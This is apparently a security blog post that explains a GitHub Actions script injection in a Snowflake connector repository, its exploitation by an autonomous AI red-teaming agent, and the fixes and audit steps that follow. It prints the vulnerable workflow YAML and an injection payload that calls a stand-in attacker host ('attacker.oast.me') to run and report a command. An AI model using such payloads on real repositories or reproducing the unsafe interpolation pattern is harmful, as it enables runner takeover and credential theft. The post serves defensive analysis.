---
title: 'AI Autofix Supply Chain Attack: The Snowflake Jira GitHub Actions Injection, Explained'
date: 2026-09-30T10:10:54+00:00
tags:
- AI security
- CI/CD security
- GitHub Actions
- supply chain
- autonomous agents
description: A GitHub Actions injection in Snowflake's connector repo gave an autonomous agent Jira access in five days. Here is the pattern, the fix, and the audit.
draft: false
schema: schema-copilot-autofix-snowflake-jira-supply-chain
cover:
  image: /images/copilot-autofix-snowflake-jira-supply-chain.png
  alt: 'AI Autofix Supply Chain Attack: The Snowflake Jira GitHub Actions Injection, Explained'
  relative: false
---

The **AI autofix supply chain attack** that reached Snowflake's internal Jira did not require a poisoned dependency, a malicious model, or an AI-authored backdoor. It required two ordinary lines of GitHub Actions YAML: an issue title interpolated into a shell `run:` block, and an `if:` guard that evaluated to true for every user on the internet.

## What Actually Happened at Snowflake: June 18 to June 23, 2026

On 2026-06-18, pull request #1218 merged into `snowflakedb/snowflake-connector-net`. Its title reads as routine maintenance: "SNOW-2069227 : Update jira workflows". The merge commit is `4a1b8ce`, and the diff touches two files for +98/-128 lines across four commits. One of those files, `.github/workflows/jira_issue.yml`, became a remote code execution primitive for anyone with a GitHub account.

Five days later, on 2026-06-23, Wiz Research's autonomous Red Agent found the flaw, built a working exploit, recovered from its own failed first attempt, and exfiltrated a Jira API token. Snowflake received the report through its HackerOne programme (report #3819931), patched the same day with PR #1402 (commit `1dc7766`), and rotated the token on 2026-06-24. The full technical account is in [Wiz Research's Red Agent writeup](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug).

The stolen token authenticated as `qa@snowflake.net` against `snowflakecomputing.atlassian.net` with read access across Snowflake's engineering, security-compliance, and bug-bounty tracking Jira projects. Snowflake's own statement confirms it received the disclosure on 2026-06-23, remediated immediately, and found no evidence of unauthorised access — its audit logs matched every anomalous query to Wiz's testing addresses. This was repository-automation credential exposure, not customer data.

Three details make this a case study rather than an anecdote. The repository had 208 stars and 156 forks — small, low-profile, and still a direct path into an internal engineering system. There is no CVE, no CVSS score, no CISA KEV entry, and no affected shipped release, because the weakness lived entirely in repository automation and never entered a connector build. And the entry point required zero permissions: the workflow triggered on `issues: opened`.

## The Wrong Headline: Why "Copilot Autofix Wrote It" Was Retracted

Wiz published its writeup on 2026-08-17 with a headline framing GitHub Copilot Autofix as implicated in writing the vulnerable code. That framing collapsed within roughly eight hours. Wiz revised the post the same day at 19:57 UTC to state that Copilot was a co-author that reviewed the merged PR and called it all-clear, and that it is unclear whether the code change was AI-assisted at all.

The mechanism behind the false attribution is worth understanding on its own, because it is a governance problem far beyond this incident. The merge commit for PR #1218 lists "Copilot Autofix powered by AI" among its co-authors. Squash-merging a pull request collapses every commit into one and carries all co-author trailers forward. A trailer therefore records participation in a pull request, not authorship of specific lines. Copilot's explicitly co-authored commit changed `jira_close.yml`. The unsafe `jira_issue.yml` refactor is a separate commit that GitHub attributes to a named Snowflake engineer. GitHub's internal review states that a human authored the vulnerable contribution and that Copilot Autofix neither reviewed nor contributed to it.

If your audit, compliance, or AI-governance story depends on git trailers, squashing destroys per-line attribution. That is checkable in your own organisation today, and it is the reason a retracted claim travelled as far as it did.

## Bug 1: Untrusted Input in a `run:` Block

The vulnerable construct stored the attacker-controlled issue title in a shell variable, then tried to sanitise it:

```yaml
# VULNERABLE (PR #1218, merged 2026-06-18)
- name: Create Jira issue
  run: |
    TITLE=$(echo '${{ github.event.issue.title }}' | sed "s/'/\\\\'/g")
    curl -sS -X POST "$JIRA_URL" -d "{\"summary\": \"$TITLE\"}"
```

The flaw is ordering. `${{ github.event.issue.title }}` is expanded by GitHub's template engine **before** the shell ever sees the line. The `sed` escaping runs after that expansion, inside the quoted string it was supposed to protect. Send an issue titled:

```
'; curl http://attacker.oast.me/$(whoami); echo '
```

and the single quote terminates `echo '...'` early. Everything after it is shell syntax. Whatever the injected command prints flows into `$TITLE`, which is then forwarded to Jira.

The generalisable rule is not "sanitise harder". It is: **escaping that runs after template expansion is escaping applied too late.** No amount of `sed` inside the script can repair a value that has already been pasted into the script's source text.

Snowflake's fix restored the pattern the repository already used before PR #1218 — the one [GitHub's Security Lab recommended](https://securitylab.github.com/resources/github-actions-untrusted-input/) in its untrusted-input guidance, which is also documented in [GitHub's own script-injection guidance for Actions](https://docs.github.com/en/actions/concepts/security/script-injections):

```yaml
# FIXED (PR #1402, commit 1dc7766, merged 2026-06-23)
- name: Create Jira issue
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: |
    payload=$(jq -n --arg title "$ISSUE_TITLE" \
      '{fields: {summary: $title, project: {key: "SNOW"}}}')
    curl -sS -X POST "$JIRA_URL" -H 'Content-Type: application/json' -d "$payload"
```

The difference is structural, not cosmetic. With `env:`, the untrusted value arrives as data in the process environment. It is never part of the script text, so it has no way to become code. `jq --arg` then performs the JSON encoding, so quotes in the title are encoded rather than interpreted. The safe pattern was not novel, was not undocumented, and had been in the file before the refactor removed it.

## Bug 2: A Security Gate That Was Always True

The second bug is the half of this incident that most coverage skips, and it is the more reusable lesson. The workflow carried this job-level guard:

```yaml
# From PR #1218 — reads as a bot filter, filters nobody
if: (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')
```

On an `issues` event, the `pull_request` payload object does not exist. `github.event.pull_request` is null, so `github.event.pull_request.user.login` is null, and the expression reduces to `null != 'whitesource-for-github-com[bot]'` — which is **true**. The condition is always satisfied. The vulnerability's reachable entry point was therefore every GitHub account on the planet, with no permissions required.

Neither bug alone produced this outcome. The injection supplied code execution on the runner; the broken gate removed every restriction on who could trigger it. An injection that only your own maintainers can reach is a much smaller problem than one any anonymous account can fire.

There is a second-order lesson that matters during review: a broken gate is worse than an absent gate, because it reads as protection. A reviewer scanning the file sees a bot-exclusion condition and registers a control. Nothing in the YAML announces that the referenced context is null under this trigger. Any workflow that reuses a pull-request condition under an issue trigger deserves a direct look — see [GitHub's Actions security concepts](https://docs.github.com/en/actions/concepts/security/script-injections) for how context objects are populated per event.

## How an Autonomous Agent Adapted Mid-Attack

The exploitation itself is the most forward-looking part of the story, because the first attempt failed and the agent fixed it without help.

Red Agent's initial payload used `#` to comment out the trailing shell, intending to discard it. Because the injected text sat inside the `TITLE=$(...)` construct, that `#` also swallowed the closing parenthesis, and the runner returned a bash syntax error rather than a shell. The agent read the failure, worked out that it needed to close the construct instead of commenting past it, and re-fired using `; echo '` to close the block cleanly. The second attempt worked. No human reviewed the error, redesigned the payload, or approved the retry.

Weaponisation timeline:

| Date (2026) | Event |
|---|---|
| 06-18 | PR #1218 merges; injection live on the default branch |
| 06-23 | Red Agent discovers, exploits, and scopes it; HackerOne report #3819931 filed |
| 06-23 | Snowflake patches via PR #1402 / commit `1dc7766` |
| 06-24 | Jira token rotated |
| 07-25 | Public disclosure deadline under Snowflake's 30-day policy |
| 08-17 | Wiz publishes; Copilot attribution corrected at 19:57 UTC |

Five days from live flaw to full autonomous exploitation. That is the difference between an automated scanner and an autonomous adversary: a scanner reports, an adversary adapts. Plan patch cycles and credential lifetimes against the second one.

## The Blind Exfiltration and the Stolen Token's Scope

Red Agent had no response channel back from the runner, so it did not need one. It used a blind out-of-band HTTP callback to an `oast.me` listener, observed originating from the Azure runner IP `20.106.182.197`. The token left the building as a DNS/HTTP beacon rather than in a terminal response.

Credential scope was the multiplier. The exfiltrated token granted read access across three Snowflake Jira projects — engineering, security-compliance, and bug-bounty tracking. [OWASP's Top 10 CI/CD Security Risks](https://owasp.org/projects/top-10-cicd-security-risks) calls this out under insufficient credential hygiene (CICD-SEC-6): repository automation credentials routinely carry far broader scope than the workflow requires. The workflow wrote Jira tickets. The token could read the bug-bounty programme.

## Who Detected It, Who Missed It, and What Is Still Disputed

Wiz disclosed responsibly under Snowflake's HackerOne programme, and Wiz corrected its own attribution within eight hours. The honest reading of this incident targets the review-gap assumption, not either company.

Two failure modes were in scope and both were detectable with tooling that already existed:

| Control | Catches injection | Catches always-true gate |
|---|---|---|
| CodeQL `actions-queries` (`code injection`) | Yes | No |
| CodeQL `actions-queries` (`if expression always true`) | No | Yes |
| zizmor `template-injection` (since v0.1.0) | Yes | Partial |
| zizmor `unsound-condition` (since v1.12.0) | No | Different mechanism |
| actionlint untrusted-input check | Yes | No |
| harden-runner (runner egress) | Detects exfiltration | No |

Three caveats belong on that table. First, CodeQL ships GitHub Actions queries covering **both** bug classes — [`Code injection` and `If expression always true`](https://codeql.github.com/codeql-query-help/actions/) — in the `codeql/actions-queries` pack inside its default and security-extended suites, so the pattern was detectable with the vendor's own published query set. Second, [zizmor's `unsound-condition` rule](https://docs.zizmor.sh/audits/) targets a different always-true mechanism — YAML block-scalar newline placement, per its maintainer — and does **not** catch this null-context `github.event.pull_request` comparison; do not count it as coverage for Bug 2. Third, an egress control is not a prevention control: harden-runner would have observed the beacon, not blocked the injection.

What remains genuinely disputed is narrower than the original headline. Wiz maintains that GitHub Advanced Security analysed the final PR revision, including the vulnerable workflow, and did not flag the injection. GitHub states that Copilot Autofix never reviewed that change. Both companies hold the scan logs and neither has published them. Both framings are bad in different ways — a product defect versus a coverage gap — and buyers of AI code review should demand to know which one they are purchasing, including whether the scanner analyses GitHub Actions workflows at all.

## Why AI Code Tools Can Reintroduce Old Bugs

Copilot Autofix's baseline reputation explains why the attribution was believed so quickly: it entered public beta on 2024-03-20, reached GA on 2024-08-14, and pairs CodeQL analysis with an LLM to propose a patch. GitHub reported median remediation time [falling from 90 minutes manual to 28 minutes](https://www.techtarget.com/cybersecurity/news/366603045/GitHub-Copilot-Autofix-tackles-vulnerabilities-with-AI) with Autofix in beta, and the "developers resolve findings more than three times faster" result held at GA.

Those numbers are real, and they do not make the tool a gate. AI code tooling predicts plausibly, and deprecated or unsafe shell patterns are statistically common in its training corpus. Security intent is lost when safer patterns are not explicitly enforced — most starkly when a refactor reintroduces a pattern that the file, and the platform vendor's own guidance, had already moved past.

## Audit Your Own Repositories This Week

The scope of this pattern is unpublished. Neither Wiz nor GitHub has counted how many public workflows interpolate untrusted issue or PR text before sanitising, or gate an issue trigger on a pull-request property. That count is the real blast radius, and it is the reason to run the audit yourself rather than wait for a number.

Do these in order:

1. **Grep for untrusted context in `run:` blocks.** Search every workflow for `${{ github.event.` inside a `run:` step: issue titles and bodies, PR titles and bodies, branch names, comment bodies, commit messages, author names. Any of these reachable from a public repository is a script-injection candidate.
2. **Check the sanitisation order.** If `sed` or a shell-level escape runs *inside* the script, after template expansion, treat it as unescaped. Only `env:` and argument-passing patterns such as `jq --arg` remove the surface.
3. **Find conditions that reference the wrong event.** For every `issues:`-triggered workflow, look for `github.event.pull_request` in an `if:`. Null-context comparisons read as protection and behave as `true`.
4. **Right-size integration tokens.** Inventory Jira, Slack, Datadog, and cloud credentials used by workflows against what each workflow actually does. A ticket-creating workflow should not hold a token with bug-bounty read scope, and every such token should be short-lived and rotated on a schedule.
5. **Instrument runner egress.** Deploy an egress-monitoring action so blind out-of-band callbacks stop being invisible. Treat anything reaching an unexpected domain from CI as an incident, not noise.
6. **Add actions-aware static analysis.** Run [zizmor](https://docs.zizmor.sh/audits/) (`template-injection`, `bot-conditions`, `unsound-condition`) and [actionlint](https://github.com/rhysd/actionlint/blob/main/docs/checks.md) in CI, and confirm your CodeQL setup actually includes the [Actions query pack](https://codeql.github.com/codeql-query-help/actions/) rather than assuming the default suite covers workflows.
7. **Protect attribution integrity.** Decide deliberately whether squashed merges are acceptable for any repository where per-line provenance matters to audit or compliance. If they are not, stop squashing those repositories.

The one thing not to do is to treat any single scanner as the backstop. The defensive layer in this incident either did not fire or did not cover the file class that broke. Coverage questions — not false-negative rates — are the ones to ask before you trust a control with the word "security" in its name.

## FAQ

### Did GitHub Copilot Autofix write the vulnerable Snowflake code?

Not established, and the evidence points away from it. Copilot appears as a co-author on the squash-merged PR #1218, but squash merges carry every commit's co-author trailer forward, so that line records participation in the pull request rather than authorship of specific lines. Copilot's explicitly co-authored commit changed `jira_close.yml`; the unsafe `jira_issue.yml` refactor is a separate commit that GitHub attributes to a named Snowflake engineer. Wiz revised its post on 2026-08-17 at 19:57 UTC to say it is unclear whether the code change was AI-assisted.

### So did AI cause this incident at all?

Yes, decisively — on the offensive side. The vulnerability was found, exploited, and scoped by Wiz Research's autonomous Red Agent with no human involvement, and it self-corrected a failed exploit payload mid-attack. The defensive AI layer is the contested part: Wiz says GitHub Advanced Security analysed the final revision and did not flag the injection, while GitHub says Copilot Autofix never reviewed that change. Both claims cannot be true, and neither company has published the scan logs.

### What exactly was the vulnerability?

A GitHub Actions script injection in `.github/workflows/jira_issue.yml`. The workflow triggered on `issues: opened` and interpolated the attacker-controlled issue title directly into a shell `run:` block, with sed-based escaping applied after GitHub's template expansion. A single quote in the title broke out of the quoted `echo` string and gave arbitrary command execution on the runner. A second bug widened it: an `if:` condition compared `github.event.pull_request.user.login` against a bot name, but on `issues` events that property is null, so the condition was always true and admitted every anonymous user.

### What is the fix for this pattern?

Pass untrusted values through environment variables instead of interpolating them into the script — the pattern Snowflake restored in PR #1402 was an `env:` block feeding `jq -n --arg`. Intermediate environment variables remove the injection surface entirely, because the value never becomes part of the script text. The general rule: escaping that runs after template expansion is escaping applied too late.

### Was Snowflake customer data compromised?

No. The exposed credential was a Jira API token used by repository automation, granting read access to Snowflake's internal engineering, security-compliance, and bug-bounty Jira projects. No connector release was affected. Snowflake patched the same day, rotated the token the next day, and its audit logs matched every anomalous query to Wiz's testing addresses, finding no evidence of unauthorised third-party access.

## Read Next

- [OpenAI Agents Attacking RubyGems: A Landmark AI Agent Supply Chain Attack in 2026](/posts/openai-agents-rubygems-2026/) — the closest sibling case, where an autonomous agent attacked package supply-chain infrastructure directly.
- [Agent Skills Supply Chain Security Guide 2026](/posts/agent-skills-supply-chain-security-guide-2026/) — malicious skills and plugins as a trust-boundary problem.
- [AI Code Security in Agentic Workflows 2026](/posts/ai-code-security-agentic-workflows-2026/) — where SAST fits and where its coverage gaps are.
- [AI Code Security Scanning Tools 2026](/posts/ai-code-security-scanning-tools-2026/) — tooling comparison for the detection section above.
- [Enterprise AI Coding Security Guardrails 2026](/posts/enterprise-ai-coding-security-guardrails-2026/) — policy controls when scanners are signals, not gates.
- [AI-Generated Code Security Statistics 2026](/posts/ai-generated-code-security-statistics-2026/) — the statistical backing for the AI code-quality framing.
- [Claude Code GitHub Actions 2026](/posts/claude-code-github-actions-2026/) — for teams wiring agents into Actions runners.
- [AI Code Security Debt Crisis 2026](/posts/ai-code-security-debt-crisis-2026/) — the broader "AI ships faster than review" thesis this incident exemplifies.
